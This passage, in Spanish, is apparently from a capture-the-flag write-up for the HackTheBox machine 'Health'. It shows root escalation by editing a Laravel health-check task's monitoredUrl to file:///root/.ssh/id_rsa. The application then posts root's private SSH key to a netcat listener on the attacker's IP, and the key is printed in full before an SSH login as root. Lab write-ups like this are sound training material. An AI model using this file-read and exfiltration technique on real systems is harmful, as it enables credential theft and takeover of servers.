CMD: UID=0    PID=13277  | mysql laravel --execute TRUNCATE tasks 
```

El archivo que está ejecutando no lo puedo modificar, ya que no soy www-data

```null
-rwxr-xr-x   1 www-data www-data   1686 May 17  2022 artisan
```

Schedule se define en el archivo Kernel.php

```null
susanne@health:/var/www/html/app$ grep -r -i "schedule"
Console/Kernel.php:use Illuminate\Console\Scheduling\Schedule;
Console/Kernel.php:    protected function schedule(Schedule $schedule)
Console/Kernel.php:            $schedule->call(function () use ($task) {
```

Su contenido es el siguiente:

```null
<?php

namespace App\Console;

use App\Http\Controllers\HealthChecker;
use App\Models\Task;
use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Console\Kernel as ConsoleKernel;
use Illuminate\Support\Facades\Log;

class Kernel extends ConsoleKernel
{

    protected function schedule(Schedule $schedule)
    {

        /* Get all tasks from the database */
        $tasks = Task::all();

        foreach ($tasks as $task) {

            $frequency = $task->frequency;

            $schedule->call(function () use ($task) {
                /*  Run your task here */
                HealthChecker::check($task->webhookUrl, $task->monitoredUrl, $task->onlyError);
                Log::info($task->id . ' ' . \Carbon\Carbon::now());
            })->cron($frequency);
        }
    }

    /**
     * Register the commands for the application.
     *
     * @return void
     */
    protected function commands()
    {
        $this->load(__DIR__ . '/Commands');

        require base_path('routes/console.php');
    }
}
?>

La función Checker se encuentra definida en el archivo HealthChecker.php

```null
<?php

namespace App\Http\Controllers;

class HealthChecker
{
    public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {

        $json = [];
        $json['webhookUrl'] = $webhookUrl;
        $json['monitoredUrl'] = $monitoredUrl;

        $res = @file_get_contents($monitoredUrl, false);
        if ($res) {

            if ($onlyError) {
                return $json;
            }

            $json['health'] = "up";
	   $json['body'] = $res;
	   if (isset($http_response_header)) {
            $headers = [];
            $json['message'] = $http_response_header[0];

            for ($i = 0; $i <= count($http_response_header) - 1; $i++) {

                $split = explode(':', $http_response_header[$i], 2);

                if (count($split) == 2) {
                    $headers[trim($split[0])] = trim($split[1]);
                } else {
                    error_log("invalid header pair: $http_response_header[$i]\n");
                }

            }

	   $json['headers'] = $headers;
	   }

        } else {
            $json['health'] = "down";
        }

        $content = json_encode($json);

        // send
        $curl = curl_init($webhookUrl);
        curl_setopt($curl, CURLOPT_HEADER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER,
            array("Content-type: application/json"));
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
        curl_exec($curl);
        curl_close($curl);

        return $json;

    }
}
?>
```

El script obtiene el contenido del input que le pasas al campo WebHook de la web explotada anteriormente

Como el PsPy también había detectado una tarea relacionada con MySQL, puede que a la hora de ejecutarse la tarea CRON se introduzca algún dato nuevo, en caso de que se llame a la función adecuada.


```null
mysql> show tables;
+------------------------+
| Tables_in_laravel      |
+------------------------+
| failed_jobs            |
| migrations             |
| password_resets        |
| personal_access_tokens |
| tasks                  |
| users                  |
+------------------------+
6 rows in set (0.00 sec)

mysql> select * from tasks;
Empty set (0.00 sec)

mysql> select * from tasks\G;
*************************** 1. row ***************************
          id: 92f937e3-fccf-4c9a-b051-d99b83aa0bd5
  webhookUrl: http://10.10.16.34:8000
   onlyError: 0
monitoredUrl: http://10.10.16.34
   frequency: *****
  created_at: 2023-01-10 16:40:17
  updated_at: 2023-01-10 16:40:17
1 row in set (0.00 sec)

```

Efectivamente, tras crear el WebHook, se introducen nuevos datos

Se podría tratar de efectuar un LFI abusando de alguno de estos campos.

Como puedo editar la base de datos, en el apartado de monitoredUrl, una vez ya he creado el WebHook desde la web, fuerzo a que sea un archivo local de la máquina, en concreto, la id_rsa del usuario root.

<img src="/writeups/assets/img/Health-htb/10.png" alt="">

```null
nc -nlvp 8080
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:49336.
POST / HTTP/1.1
Host: 10.10.16.34:8080
Accept: */*
Content-type: application/json
Content-Length: 1832
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.16.34:8080","monitoredUrl":"file:\/\/\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}
```

Y finalmente obtienes la id_rsa

```null
cat id_rsa | jq .body -r | sponge id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl
hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8
efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2
1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj
nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3
sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou
fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q
0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ
zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT
rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB
N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD
SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o
++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp
UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a
vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU
6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm
QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G
-----END RSA PRIVATE KEY-----

chmod 600 id_rsa

ssh root@health.htb -i id_rsa

```
